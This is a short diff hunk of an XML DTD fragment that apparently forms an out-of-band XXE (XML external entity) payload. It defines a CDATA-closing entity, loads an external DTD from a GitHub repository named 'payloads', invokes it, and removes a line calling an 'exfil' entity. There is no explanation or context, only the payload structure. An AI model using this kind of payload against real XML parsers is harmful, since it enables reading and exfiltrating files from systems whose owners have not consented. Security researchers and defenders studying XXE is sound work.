@@ -3,4 +3,3 @@
 <!ENTITY % end "]]>">
 <!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/mrlaksh20/payloads/main/dtd.xml">
 %dtd;
-%exfil;
